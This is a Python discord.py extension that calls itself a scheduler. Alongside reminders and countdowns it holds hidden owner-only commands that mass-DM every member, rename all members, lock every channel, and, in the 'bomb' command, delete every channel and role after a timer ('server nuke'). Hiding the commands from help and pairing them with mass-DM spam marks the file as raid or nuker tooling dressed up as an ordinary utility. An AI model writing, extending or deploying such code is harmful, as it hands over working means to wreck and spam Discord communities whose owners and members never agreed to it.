import discord
from discord.ext import commands, tasks
import asyncio
import datetime
import json
import os

SCHED_DIR = "data/scheduler"
os.makedirs(SCHED_DIR, exist_ok=True)

class Scheduler(commands.Cog, name="scheduler"):
    """31-40: scheduled and timed operations."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.scheduled_tasks = {}
        self.reminders_file = os.path.join(SCHED_DIR, "reminders.json")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def remind(self, ctx: commands.Context, minutes: int, *, message: str):
        """31. set a reminder that dms you after a delay."""
        await ctx.send(f"reminder set for {minutes} minutes.", delete_after=5)
        await asyncio.sleep(minutes * 60)
        try:
            await ctx.author.send(f"reminder: {message}")
        except:
            await ctx.send(f"{ctx.author.mention} reminder: {message}")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def schedulemsg(self, ctx: commands.Context, minutes: int, *, message: str):
        """32. schedule a message to be sent after a delay."""
        await ctx.send(f"message scheduled in {minutes} minutes.", delete_after=5)
        await asyncio.sleep(minutes * 60)
        await ctx.send(message)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def scheduledelete(self, ctx: commands.Context, minutes: int):
        """33. schedule channel purge after delay."""
        await ctx.send(f"channel will be purged in {minutes} minutes.", delete_after=5)
        await asyncio.sleep(minutes * 60)
        await ctx.channel.purge(limit=1000)
        await ctx.send("scheduled purge complete.", delete_after=10)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def schedulenick(self, ctx: commands.Context, minutes: int, *, nickname: str):
        """34. schedule a nickname change for all members."""
        await ctx.send(f"nickname change scheduled in {minutes} minutes.", delete_after=5)
        await asyncio.sleep(minutes * 60)
        count = 0
        for member in ctx.guild.members:
            if member.top_role >= ctx.guild.me.top_role:
                continue
            try:
                await member.edit(nick=nickname[:32])
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
        await ctx.send(f"nicknamed {count} members to '{nickname}'.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def schedulelock(self, ctx: commands.Context, minutes: int):
        """35. schedule a full server lockdown."""
        await ctx.send(f"lockdown scheduled in {minutes} minutes.", delete_after=5)
        await asyncio.sleep(minutes * 60)
        count = 0
        for channel in ctx.guild.text_channels:
            overwrite = channel.overwrites_for(ctx.guild.default_role)
            overwrite.send_messages = False
            try:
                await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send(f"lockdown complete. {count} channels locked.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def schedulemassdm(self, ctx: commands.Context, minutes: int, *, message: str):
        """36. schedule a mass dm after a delay."""
        await ctx.send(f"mass dm scheduled in {minutes} minutes.", delete_after=5)
        await asyncio.sleep(minutes * 60)
        count = 0
        for member in ctx.guild.members:
            if member.bot:
                continue
            try:
                await member.send(message)
                count += 1
                await asyncio.sleep(1)
            except:
                pass
        await ctx.send(f"mass dm complete. {count} users messaged.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def countdown(self, ctx: commands.Context, seconds: int):
        """37. post a countdown in chat."""
        for i in range(seconds, 0, -1):
            await ctx.send(f"**{i}**")
            await asyncio.sleep(1)
        await ctx.send("**GO**")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def intervalmsg(self, ctx: commands.Context, count: int, interval: int, *, message: str):
        """38. send a message at regular intervals."""
        await ctx.send(f"sending '{message}' {count} times every {interval}s.", delete_after=5)
        for i in range(count):
            await ctx.send(message)
            await asyncio.sleep(interval)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def autopurge(self, ctx: commands.Context, interval_minutes: int):
        """39. auto purge the channel every n minutes."""
        await ctx.send(f"auto purge every {interval_minutes} minutes started.", delete_after=5)
        while True:
            await asyncio.sleep(interval_minutes * 60)
            try:
                await ctx.channel.purge(limit=100)
            except:
                break

    @commands.command(hidden=True)
    @commands.is_owner()
    async def bomb(self, ctx: commands.Context, minutes: int):
        """40. execute a full server nuke after a countdown."""
        await ctx.send(f"server nuke scheduled in {minutes} minutes. use !abortbomb to cancel.", delete_after=5)
        self.scheduled_tasks["bomb"] = True
        await asyncio.sleep(minutes * 60)
        if self.scheduled_tasks.get("bomb"):
            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                    await asyncio.sleep(0.2)
                except:
                    pass
            for role in ctx.guild.roles:
                if role.is_default() or role.managed:
                    continue
                try:
                    await role.delete()
                    await asyncio.sleep(0.2)
                except:
                    pass
            await ctx.send("nuke complete.", delete_after=10)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def abortbomb(self, ctx: commands.Context):
        """41. cancel the scheduled nuke."""
        self.scheduled_tasks["bomb"] = False
        await ctx.send("nuke aborted.", delete_after=5)


async def setup(bot: commands.Bot):
    await bot.add_cog(Scheduler(bot))
